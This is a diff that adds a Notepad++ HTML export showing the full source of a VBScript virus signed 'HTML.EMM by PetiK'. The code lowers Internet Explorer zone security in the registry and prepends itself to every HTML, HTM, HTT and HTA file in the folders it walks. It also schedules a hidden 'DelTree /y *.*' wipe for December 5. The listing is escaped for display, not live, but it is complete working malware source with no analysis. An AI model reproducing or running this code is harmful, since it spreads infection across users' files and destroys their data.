@@ -1,0 +1,97 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	font-weight: bold;
+	color: #FF0000;
+}
+.sc3 {
+	color: #0000FF;
+}
+.sc4 {
+	color: #808080;
+}
+.sc6 {
+	font-weight: bold;
+}
+.sc7 {
+}
+.sc10 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc6">&lt;!--</span><span class="sc7">HTML.EMM</span><span class="sc6">--&gt;</span><span class="sc0">
+</span><span class="sc6">&lt;</span><span class="sc7">html</span><span class="sc6">&gt;&lt;</span><span class="sc7">body</span><span class="sc6">&gt;</span><span class="sc0">
+</span><span class="sc6">&lt;</span><span class="sc7">script</span><span class="sc0"> </span><span class="sc7">Language</span><span class="sc6">=</span><span class="sc4">"VBScript"</span><span class="sc6">&gt;&lt;!--</span><span class="sc0">
+</span><span class="sc3">on</span><span class="sc0"> </span><span class="sc3">error</span><span class="sc0"> </span><span class="sc3">resume</span><span class="sc0"> </span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc1">REM HTML.EMM by PetiK
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">location.protocol</span><span class="sc6">=</span><span class="sc4">"file:"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">randomize</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc10">int</span><span class="sc6">(</span><span class="sc7">rnd</span><span class="sc6">*</span><span class="sc2">10</span><span class="sc6">)+</span><span class="sc2">1</span><span class="sc6">=</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">msgbox</span><span class="sc0"> </span><span class="sc4">"Hi, it is PetiK !"</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">a0h2c6</span><span class="sc6">=</span><span class="sc7">createobject</span><span class="sc6">(</span><span class="sc4">"WScript.Shell"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">d1d4a4</span><span class="sc6">=</span><span class="sc7">createobject</span><span class="sc6">(</span><span class="sc4">"Scripting.FileSystemObject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">a8a2i3</span><span class="sc6">=</span><span class="sc7">Replace</span><span class="sc6">(</span><span class="sc7">location.href</span><span class="sc6">,</span><span class="sc4">"/"</span><span class="sc6">,</span><span class="sc4">"\"</span><span class="sc6">):</span><span class="sc7">a8a2i3</span><span class="sc6">=</span><span class="sc7">Replace</span><span class="sc6">(</span><span class="sc7">a8a2i3</span><span class="sc6">,</span><span class="sc4">"file:\\\"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc6">):</span><span class="sc7">a8a2i3</span><span class="sc6">=</span><span class="sc7">d1d4a4.GetParentFolderName</span><span class="sc6">(</span><span class="sc7">a8a2i3</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">f3g8f3</span><span class="sc6">=</span><span class="sc7">document.body.createtextrange</span><span class="sc0">
+</span><span class="sc7">a0h2c6.Regwrite</span><span class="sc4">"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201"</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"REG_DWORD"</span><span class="sc0">
+</span><span class="sc7">a0h2c6.RegWrite</span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201"</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"REG_DWORD"</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">month</span><span class="sc6">(</span><span class="sc7">now</span><span class="sc6">)=</span><span class="sc2">12</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">day</span><span class="sc6">(</span><span class="sc7">now</span><span class="sc6">)=</span><span class="sc2">5</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">a0h2c6.Run</span><span class="sc0"> </span><span class="sc4">"DelTree /y *.* &gt;null"</span><span class="sc6">,</span><span class="sc7">vbHide</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">f8g2a6</span><span class="sc6">(</span><span class="sc7">a8a2i3</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">f8g2a6</span><span class="sc6">(</span><span class="sc7">d1d4a4.BuildPath</span><span class="sc6">(</span><span class="sc7">d1d4a4.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">),</span><span class="sc4">"WEB"</span><span class="sc6">))</span><span class="sc0">
+</span><span class="sc7">f8g2a6</span><span class="sc6">(</span><span class="sc7">a0h2c6.SpecialFolders</span><span class="sc6">(</span><span class="sc4">"Desktop"</span><span class="sc6">))</span><span class="sc0">
+</span><span class="sc7">f8g2a6</span><span class="sc6">(</span><span class="sc7">a0h2c6.SpecialFolders</span><span class="sc6">(</span><span class="sc4">"MyDocuments"</span><span class="sc6">))</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc3">sub</span><span class="sc0"> </span><span class="sc7">f8g2a6</span><span class="sc6">(</span><span class="sc7">b3e2h2</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">on</span><span class="sc0"> </span><span class="sc3">error</span><span class="sc0"> </span><span class="sc3">resume</span><span class="sc0"> </span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">d1d4a4.FolderExists</span><span class="sc6">(</span><span class="sc7">b3e2h2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc3">Do</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">e1h2f9</span><span class="sc6">=</span><span class="sc7">d1d4a4.GetFolder</span><span class="sc6">(</span><span class="sc7">b3e2h2</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">b3e2h2</span><span class="sc6">=</span><span class="sc7">d1d4a4.GetParentFolderName</span><span class="sc6">(</span><span class="sc7">b3e2h2</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">e8h0b1</span><span class="sc6">=</span><span class="sc7">e1h2f9.Files</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">each</span><span class="sc0"> </span><span class="sc7">a7e8f5</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">e8h0b1</span><span class="sc0">
+</span><span class="sc7">f0f0f6</span><span class="sc6">=</span><span class="sc7">ucase</span><span class="sc6">(</span><span class="sc7">d1d4a4.GetExtensionName</span><span class="sc6">(</span><span class="sc7">a7e8f5.Name</span><span class="sc6">))</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">f0f0f6</span><span class="sc6">=</span><span class="sc4">"HTML"</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">f0f0f6</span><span class="sc6">=</span><span class="sc4">"HTM"</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">f0f0f6</span><span class="sc6">=</span><span class="sc4">"HTT"</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">f0f0f6</span><span class="sc6">=</span><span class="sc4">"HTA"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">f7f2g5</span><span class="sc6">=</span><span class="sc7">d1d4a4.OpenTextFile</span><span class="sc6">(</span><span class="sc7">a7e8f5.path</span><span class="sc6">,</span><span class="sc2">1</span><span class="sc6">,</span><span class="sc3">False</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">i6i2g2</span><span class="sc6">=</span><span class="sc7">f7f2g5.Readline</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">i6i2g2</span><span class="sc6">=</span><span class="sc4">"&lt;!--HTML.EMM--&gt;"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">f7f2g5.close</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">else</span><span class="sc0">
+</span><span class="sc7">c8b2f9</span><span class="sc6">(</span><span class="sc7">a7e8f5.path</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">Loop</span><span class="sc0"> </span><span class="sc3">Until</span><span class="sc0"> </span><span class="sc7">e1h2f9.IsRootFolder</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">sub</span><span class="sc0">
+</span><span class="sc3">sub</span><span class="sc0"> </span><span class="sc7">c8b2f9</span><span class="sc6">(</span><span class="sc7">i6d0f9</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">f7f2g5</span><span class="sc6">=</span><span class="sc7">d1d4a4.OpenTextFile</span><span class="sc6">(</span><span class="sc7">i6d0f9</span><span class="sc6">,</span><span class="sc2">1</span><span class="sc6">,</span><span class="sc3">False</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">b1c1f4</span><span class="sc6">=</span><span class="sc7">f7f2g5.ReadAll</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">f7f2g5.close</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">f7f2g5</span><span class="sc6">=</span><span class="sc7">d1d4a4.OpenTextFile</span><span class="sc6">(</span><span class="sc7">i6d0f9</span><span class="sc6">,</span><span class="sc2">2</span><span class="sc6">,</span><span class="sc3">False</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">f7f2g5.WriteLine</span><span class="sc6">(</span><span class="sc4">"&lt;!--HTML.EMM--&gt;"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">f7f2g5.Write</span><span class="sc6">(</span><span class="sc4">"&lt;html&gt;&lt;body&gt;"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">f7f2g5.WriteLine</span><span class="sc0"> </span><span class="sc7">f3g8f3.htmlText</span><span class="sc0">
+</span><span class="sc7">f7f2g5.WriteLine</span><span class="sc6">(</span><span class="sc4">"&lt;/body&gt;&lt;/html&gt;"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">f7f2g5.Write</span><span class="sc6">(</span><span class="sc7">b1c1f4</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">f7f2g5.Close</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">sub</span><span class="sc0">
+</span><span class="sc6">--&gt;&lt;/</span><span class="sc7">script</span><span class="sc6">&gt;</span><span class="sc0">
+</span><span class="sc6">&lt;/</span><span class="sc7">body</span><span class="sc6">&gt;&lt;/</span><span class="sc7">html</span><span class="sc6">&gt;</span><span class="sc0">
+</span></div></body>
+</html>
